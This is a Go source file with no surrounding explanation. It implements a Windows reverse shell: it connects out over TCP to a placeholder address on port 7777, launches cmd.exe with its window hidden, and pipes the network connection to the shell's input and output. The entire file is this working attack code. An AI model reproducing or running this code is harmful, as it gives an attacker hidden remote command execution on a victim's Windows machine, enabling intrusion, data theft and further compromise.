package main

import (
	"net"
	"os/exec"
	"syscall"
	"io"
)

const (
	address = "0.0.0.0:7777"
)

func main() {
	conn,_ := net.Dial("tcp",address)
	defer conn.Close()
	cmd := exec.Command("cmd.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	stdin,_:= cmd.StdinPipe()
	stdout,_ := cmd.StdoutPipe()
	cmd.Start()
	go io.Copy(stdin,conn)
	io.Copy(conn,stdout)
}
